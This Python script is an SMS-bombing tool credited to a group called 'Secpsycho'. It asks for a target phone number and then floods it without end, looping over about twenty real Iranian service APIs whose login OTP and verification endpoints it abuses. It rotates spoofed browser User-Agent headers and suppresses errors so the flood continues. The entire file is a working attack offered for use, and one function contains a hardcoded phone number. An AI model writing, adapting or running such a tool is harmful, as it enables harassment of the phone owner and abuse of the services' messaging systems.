import os 
try:
    os.system("pip install requests")
    os.system("pip install colorama")
except:
    library = input("The required libraries are not installed for you. Do you want to continue? y/n")
    if library == "y":
        pass
    else:
        sys.exit()
import sys
import requests
from time import sleep
from colorama import Fore as color  
import random
import time 


os.system("cls")
time.sleep(1)
print(color.CYAN+"LODING ")
time.sleep(1)
print(color.CYAN+".")
time.sleep(1)
print(color.CYAN+". .")
time.sleep(1)
print(color.CYAN+". . .")
time.sleep(1)
print(color.CYAN+". . . .")
time.sleep(2)
os.system("cls")
time.sleep(2.2)
print(color.LIGHTRED_EX+"""
███████ ███    ███ ███████         ██████   ██████   ██████  ███    ███ ██████  ███████ ██████  
██      ████  ████ ██              ██   ██ ██    ██ ██    ██ ████  ████ ██   ██ ██      ██   ██ 
███████ ██ ████ ██ ███████         ██████  ██    ██ ██    ██ ██ ████ ██ ██████  █████   ██████  
     ██ ██  ██  ██      ██         ██   ██ ██    ██ ██    ██ ██  ██  ██ ██   ██ ██      ██   ██ 
███████ ██      ██ ███████ ███████ ██████   ██████   ██████  ██      ██ ██████  ███████ ██   ██ 
                                                                                                
""")

print(color.LIGHTRED_EX+"""
------------------------------------------------------
|||           Developer: SecAmir , Electron         |||
|||           group : Secpsycho                     |||               
------------------------------------------------------ 
""")
time.sleep(2)
num = input(color.YELLOW+"[+]ENTER Number[0-98]: ")
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]      
def divar_bomber(number):
    rhead = random.choice(heads)
    divarnumber = {"phone":number}
    divar = 'https://api.divar.ir/v5/auth/authenticate'
    req = requests.post(divar, json=divarnumber, headers=rhead)
def tapsi_bomber(number):
    rhead = random.choice(heads)
    tapsinumber = {"credential":{"phoneNumber":"0"+number,"role":"DRIVER"}}
    tapsi = 'https://tap33.me/api/v2/user'
    originalrequest = requests.post(tapsi, json= tapsinumber, headers=rhead)
   
def snap_bomber(number):
    rhead = random.choice(heads)
    phonenumber = {"cellphone":"0"+number}
    url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp'
    try:
        req = requests.post(url,data=phonenumber,json=rhead)   
    except:
       pass
def snap_taxi(number):
    rhead = random.choice(heads)
    url_box = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    json_box = {"cellphone":"+98" + number}
    req = requests.post(url=url_box,json=json_box,headers=rhead)
def snap_box(number):
    rhead = random.choice(heads)
    url_box = "https://app.snapp-box.com/api/v2/auth/otp/send"
    json_box = {"phoneNumber":"0" + number}
    req = requests.post(url=url_box,json=json_box,headers=rhead)
def sheypor(number):
    url_sh = "https://www.sheypoor.com/api/v10.0.0/auth/send"
    json_sh = {"username": "0"+number}
    random_head = random.choice(heads)
    req2 = requests.post(url=url_sh,json=json_sh,headers=random_head)
        
def alibaba(number):
    url_al = "	https://ws.alibaba.ir/api/v3/account/mobile/otp"
    json_al = {"phoneNumber":"0"+number}

    random_head = random.choice(heads)
    req4 = requests.post(url=url_al,json=json_al,headers=random_head)
    
def snap_2(number):
   
    url_box = "https://app.snapp-box.com/api/v2/auth/otp/send"
    json_box = {"phoneNumber":"0"+number}

    random_head = random.choice(heads)
    req5 = requests.post(url=url_box,json=json_box,headers=random_head)
def digikala(number): 
    url_digi = "https://api.digikala.com/v1/user/authenticate/"
    json_digi = {"username":"0"+number}

    random_head = random.choice(heads)
    req6 = requests.post(url=url_digi,json=json_digi,headers=random_head)
def familo(number):
    
    url_fi = "https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1"
    json_fi = {"account":"0"+number}


    random_head = random.choice(heads)
    req7 = requests.post(url=url_fi,json=json_fi,headers=random_head)

def buskol(number):
    
    url_buskol = "https://www.buskool.com/send_verification_code"
    json_buskol = {"phone":f"0{number}"}
    random_head = random.choice(heads)
    req_buskol = requests.post(url=url_buskol,json=json_buskol,headers=random_head)

def pinket(number):
    
    url_pinket = "https://pinket.com/api/cu/v2/phone-verification"
    json_pinket = {"phoneNumber":"0"+number}
    random_head = random.choice(heads)
    req_pinket = requests.post(url=url_pinket,json=json_pinket,headers=random_head)
def footlball360(number):
    url_footbal = "https://football360.ir/api/auth/verify-phone/"
    json_footbal = {"phone_number":f"+98{number}"}
    random_head = random.choice(heads)
    req_foot = requests.post(url=url_footbal,json=json_footbal,headers=random_head)
def doktor(number):
    url_d = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
    json_d = {"source":"besina","mobile":"0"+number}
    random_head = random.choice(heads)
    req_d = requests.post(url=url_d,json=json_d,headers=random_head)
def lasts(number):
    url_l = "https://lastsecond.ir/auth/register/token"
    json_l = {"username":"0"+number,"referral_code":"null"}
    random_head = random.choice(heads)
    req_l = requests.post(url=url_l,json=json_l,headers=random_head)
def snapfood(number):
    url_sn = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=8fe4b8f2-49c7-4315-988d-8b00bbbf1c21&locale=fa"
    json_sn = "cellphone=0"+number
    random_head = random.choice(heads)
    req_l = requests.post(url=url_sn,json=json_sn,headers=random_head)
def lando(number):
    url_lando = "https://api.lendo.ir/api/customer/auth/send-otp"
    json_lando = {"mobile":"0"+number}
    random_head = random.choice(heads)
    req_l = requests.post(url=url_lando,json=json_lando,headers=random_head)
def freelanc(number):
    url_f = "https://ponisha.ir/send-mobile-verfication"
    json_f = {"mobile":"+989936331747","type":"1"}
    random_head = random.choice(heads)
    req_l = requests.post(url=url_f,json=json_f,headers=random_head)
def job_v(number):
    url_j = "https://account.jobvision.ir/Candidate/Validate"
    json_j = {"PhoneNumberOrEmail":"0"+number,"CaptchaInputText":"","Token":""}
    random_head = random.choice(heads)
    req_l = requests.post(url=url_j,json=json_j,headers=random_head)
def jabama(number):
    url_job = "https://taraazws.jabama.com/api/v4/account/send-code"
    json_job = {"mobile":"0"+number}
    random_head = random.choice(heads)
    req_l = requests.post(url=url_job,json=json_job,headers=random_head)
os.system("cls")
time.sleep(3)      
print(f'\n  {color.RED}[{color.GREEN}+{color.RED}]{color.GREEN} Attack started')

while True :
        try:
            divar_bomber(num)
        except:
            pass
        try:
            tapsi_bomber(num)
        except:
            pass
        try:
            snap_box(num)
        except:
            pass
        try:
            snap_taxi(num)
        except:
            pass
        try:
            snap_bomber(num)
        except:
            pass
        try:
            sheypor(num)
        except:
            pass
        try:
             alibaba(num)
        except:
            pass
        try:           
            digikala(num)
        except:
            pass
        try:
            familo(num)   
        except:
            pass
        try:
            pinket(num)
        except:
            pass
        try:
            footlball360(num)
        except:
            pass
        try:
            doktor(num)
        except:
            pass
        try:
            lasts(num)
        except:
            pass
        try:
            snapfood(num)
        except:
            pass
        try:
            lando(num)
        except:
            pass
        try:
            freelanc(num)
        except:
            pass
        try:
            job_v(num)
        except:
            pass
        try:
            jabama(num)
        except:
            pass